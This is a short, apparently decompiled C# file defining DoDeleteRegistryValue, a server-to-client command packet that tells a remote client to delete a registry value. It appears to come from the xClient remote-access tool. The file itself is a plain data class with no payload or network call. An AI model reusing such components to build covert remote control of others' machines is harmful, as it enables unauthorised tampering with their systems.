using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDeleteRegistryValue : GInterface4
{
	public string KeyPath { get; set; }

	public string ValueName { get; set; }

	public DoDeleteRegistryValue(string keyPath, string valueName)
	{
		KeyPath = keyPath;
		ValueName = valueName;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
